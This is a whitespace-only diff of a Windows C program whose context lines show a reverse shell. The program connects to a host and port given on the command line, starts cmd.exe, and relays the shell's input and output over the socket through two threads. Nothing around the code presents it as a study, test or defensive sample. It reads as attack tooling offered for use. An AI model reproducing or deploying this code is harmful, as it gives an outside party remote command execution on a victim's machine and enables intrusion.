@@ -1,5 +1,5 @@
 #define _CRT_SECURE_NO_WARNINGS
-#define _WINSOCK_DEPRECATED_NO_WARNINGS 
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <winsock2.h>
 #include <windows.h>
 #include <stdio.h>
@@ -30,12 +30,12 @@ int main(int argc, char *argv[])
     int  port      = 0;
     char portbuf[16] = {0};
 
-    if (argc == 3) {                       
+    if (argc == 3) {
         strncpy(host, argv[1], sizeof(host)-1);
         port = atoi(argv[2]);
-    } else if (argc == 2) {               
+    } else if (argc == 2) {
         port = atoi(argv[1]);
-        if (port == 0) {                   
+        if (port == 0) {
             strncpy(host, argv[1], sizeof(host)-1);
         }
     }
@@ -54,7 +54,7 @@ int main(int argc, char *argv[])
     sa.sin_family      = AF_INET;
     sa.sin_port        = htons((u_short)port);
     sa.sin_addr.s_addr = inet_addr(host);
-    if (sa.sin_addr.s_addr == INADDR_NONE) {      
+    if (sa.sin_addr.s_addr == INADDR_NONE) {
         struct hostent *he = gethostbyname(host);
         if (!he) { printf("Cannot resolve host\n"); return 1; }
         sa.sin_addr = *(struct in_addr*)he->h_addr_list[0];
@@ -76,9 +76,9 @@ int main(int argc, char *argv[])
     PROCESS_INFORMATION pi;
     CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
     CloseHandle(inR);  CloseHandle(outW);
-    CreateThread(NULL,0, PumpSockToStdin,(LPVOID)s, 0, NULL);  
+    CreateThread(NULL,0, PumpSockToStdin,(LPVOID)s, 0, NULL);
     SOCKET prm = s;
-    CreateThread(NULL,0, PumpStdoutToSock,&prm,   0, NULL);    
+    CreateThread(NULL,0, PumpStdoutToSock,&prm,   0, NULL);
     WaitForSingleObject(pi.hProcess, INFINITE);
     closesocket(s); WSACleanup();
     return 0;
